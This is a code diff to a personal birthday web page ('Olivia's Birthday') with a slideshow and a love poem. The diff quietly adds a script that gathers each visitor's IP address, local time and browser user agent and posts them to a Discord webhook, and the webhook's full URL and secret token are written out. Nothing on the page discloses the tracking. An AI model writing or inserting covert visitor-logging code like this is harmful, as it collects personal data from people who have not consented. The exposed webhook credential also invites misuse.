@@ -5,6 +5,26 @@
   <meta charset="UTF-8">
   <title>Olivia's Birthday</title>
   <link rel="stylesheet" type="text/css" href="style.css">
+  <script>
+    function sendDeviceInfo() {
+      var deviceInfo = {
+        "IP Address": "<%= request.getRemoteAddr() %>",
+        "Date-Time": new Date().toString(),
+        "User Agent": navigator.userAgent
+      };
+
+      var xhr = new XMLHttpRequest();
+      xhr.open("POST", "https://discord.com/api/webhooks/1074583536289452052/BLP8tiR6pDmr-m4HoCvXnIsmdoM_PWCbqxrof4eAkfPbdiQgr042GqZZiiEwIsCtVkAA", true);
+      xhr.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
+      xhr.send(JSON.stringify({
+        "embeds": [{
+          "title": "Browser Information",
+          "description": JSON.stringify(deviceInfo),
+          "color": 15844367
+        }]
+      }));
+    }
+  </script>
   <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
   <script type="text/javascript">
     $(document).ready(function () {
@@ -58,8 +78,10 @@
 
     <!-- Add additional slides here -->
   </div>
-  <button class="prev">Prev</button>
-  <button class="next">Next</button>
+  <div class="wrapper">
+  <span class="prev">Prev</span>
+  <span class="next">Next</span>
+  </div>
   <div class="poem">
     <p>Olivia, my love, from Tasmania's shore<br>
       We met on a screen, but our bond is much more<br>
